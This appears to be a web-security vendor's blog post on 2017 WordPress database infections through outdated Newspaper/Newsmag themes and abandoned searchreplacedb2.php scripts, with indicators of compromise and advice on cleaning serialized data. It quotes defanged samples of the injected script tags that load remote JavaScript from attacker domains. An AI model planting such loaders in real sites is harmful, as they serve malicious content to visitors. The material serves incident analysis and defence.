@@ -1,0 +1,73 @@
+Old Themes, Abandoned Scripts and Pitfalls of Cleaning Serialized Data
+
+Over the summer, we’ve seen waves of WordPress database infections that use vulnerabilities in tagDiv’s Newspaper/Newsmag themes or InterconnectIT Search and Replace scripts (searchreplacedb2.php).
+The injections range from ad scripts coming from established ad networks like shorte.st to new domains created specifically for those attacks.
+Typically, injected scripts look like this:
+<s cript type='text/javascript' src='hxxps://con1.sometimesfree[.]biz/c.js'></script>
+Or:
+<s cript type="text/javascript">var t = document.createElement("script");
+t.type = "text/javascript"; t.src = "hxxps://src[.]dancewithme[.]biz/src.js";
+document.head.appendChild(t);</script>
+Or:
+
+The most noticeable malicious URLs that we’ve seen lately are:
+
+con1.sometimesfree[.]biz/c.js (185.82.217.166 Bulgaria)
+java.sometimesfree[.]biz/counter.js (185.82.217.166 Bulgaria)
+javascript.sometimesfree[.]biz/script.js (185.82.217.166 Bulgaria)
+js.givemealetter[.]biz/script.js (185.82.217.166 Bulgaria)
+go.givemealetter[.]biz/click.html (185.82.217.166 Bulgaria)
+traffictrade[.]life/scripts.js (200.7.105.43 United Kingdom)
+blue.traffictrade[.]life/main.js (200.7.105.43 United Kingdom)
+js.trysomethingnew[.]eu/analytics.js (94.156.144.19 Bulgaria)
+get.simplefunsite[.]info/rw.js (won’t resolve atm)
+post.simplefunsite[.]info/go.php?rewrite=81 (won’t resolve atm)
+src.dancewithme[.]biz/src.js (185.159.82.2 – Russia)
+go.dancewithme[.]biz/red.php (185.159.82.2 – Russia)
+mp.trymynewspirit[.]com/s.js (94.156.189.62 Bulgaria)
+
+They are all new domains registered specifically for this attack:
+
+traffictrade[.]life – created on July 3rd, 2017
+trysomethingnew[.]eu – created on Aug 11th, 2017
+sometimesfree[.]biz – created on August 22nd, 2017
+givemealetter[.]biz – created on August 27th, 2017
+simplefunsite.info – created on September 2nd, 2017
+dancewithme[.]biz – created on September 5th, 2017
+trymynewspirit[.]com – created on September 18th, 2017
+
+Malware in WordPress Database
+In most cases, the scripts are injected right before <a href  tags in the post content (wp_posts), meaning that webmasters may need to remove multiple injected scripts from hundreds of posts in the database – definitely not a task you want to do manually!
+There are some tools and customs scripts that can help with removing the malicious content from the database, but there are also pitfalls. Hackers don’t limit this attack to the wp_posts table only. They also inject scripts into the wp_options table, which usually stores code for various widgets and theme/plugin settings. In many cases, the wp_options values are serialized and the injections look like this:
+
+If you simply remove the malicious script directly from the database, it will break the serialization because the format relies on certain lengths of the string values. If the lengths don’t match, the serialized values won’t load – which may break a plugin/widget – and sometimes may even prevent a whole website from loading properly.
+Infecting Serialized Data
+How do hackers inject scripts inside the serialized data without breaking websites? As we mentioned, these attacks use vulnerabilities in old versions of Newspaper/Newsmag themes and Interconnect IT Search and Replace DB scripts.
+In case of Newspaper/Newsmag themes, the themes actually serialize and save data for the attacker (in the wp_options table) when they exploit the vulnerability by crafting malicious POST request to admin-ajax.php. This vector limits (the initial) infection to the wp_options table. In this case, usually, all you need to do is find the contaminated theme option in the WordPress admin area (usually it’s in the “Ads”  or “Custom Javascript” section of the theme) and remove the injected script. After doing this, WordPress will save new serialized data correctly for you.
+Abusing DB Search and Replace Script
+The Search and Replace vector is more complex. In this case, hackers use the searchreplacedb2.php file (the legitimate Interconnect IT Database Search and Replace tool).
+Here’s how this attack looks in access logs:
+
+This is a tool that is specifically designed to work with WordPress database. It automatically loads database credentials from wp-config.php files so that hackers don’t even have to guess (or try to steal) them.
+What’s also important is that this tool is aware that it’s common for WordPress to save serialized data in the database, so all the search and replace operations correctly work with serialized values.
+Cleanup Approaches
+With this vector, webmasters should take care to correctly remove the malware from the database. One way to do it is using the WordPress admin interface, cleaning every post one by one. The next step is to locate every widget or form that contains infected data in theme/plugin options.
+Widget with Injected Script
+
+Infected Custom Javascript Setting of the Newspaper Theme
+However, this approach is too laborious – webmasters may need to manually fix hundreds of post and check dozens of options. It’s also not reliable  – webmasters could miss some infected posts/widgets/options, and some options may not even have a GUI for editing them.
+The more efficient solution would be to use specialized search and replace tools or WordPress plugins that correctly work with serialized data.
+The irony is the searchreplacedb2.php script that hackers use for these infections is a tool that you can use to clean your site. This tool is equally good for infecting a website and reversing the infection.
+If you placed this script on your site yourself to perform database maintenance tasks, and then it was used by hackers to infect your sites (because you forgot to rename it during use and delete it after) then you should use it one more time before you finally delete it from your server.
+You can search the database for the injected malicious script and then replace it with an empty string (or with a space if empty string is not accepted as a replacement).
+Conclusion
+Most modern CMS applications store data and settings in the database, so for hackers, having direct access to the database can be just as useful as having access to files on server.
+There are multiple known vectors for database attacks. In this case, hackers used two quite different vectors: a vulnerability in old versions of popular premium WordPress themes, and popular legitimate database management scripts abandoned in publicly accessible sections of websites.
+The main lesson of these infections are:
+
+Keep your themes and plugins up to date. Even premium ones. The Newspaper theme’s version should be at least 6.7.2 and Newsmag should be at least 3.0. Or use a website firewall that will block attacks that try to exploit known (and unknown) vulnerabilities in your old software.
+Don’t abandon maintenance scripts on your site. When you use them, make sure they can’t be misused by anyone else. Rename them to prevent easy discovery, password protect them if possible, and remove them immediately when finished the task.
+WordPress database infections require special attention. If malware is injected into a serialized data, you can’t simply remove it directly from the database. You need to preserve the integrity of the serialized data, or you risk breaking your site. If you are not comfortable modifying serialized data manually, check for search and replace scripts and plugins that are aware of this problem. But don’t forget about lesson #2 – don’t abandon your maintenance tools in public access!
+
+If you require assistance with cleaning an infection like this, we can help. We recommend setting up an alert system and maintaining access logs so you can be aware when something like this happens. We also recommend using an integrity monitoring service in place. We offer a free security plugin for WordPress and advanced scanning, monitoring, and protection through our complete website security platform.
+Update: This attack is not limited to the database. Recently, we began coming across the same scripts injected into WordPress theme header.php files.
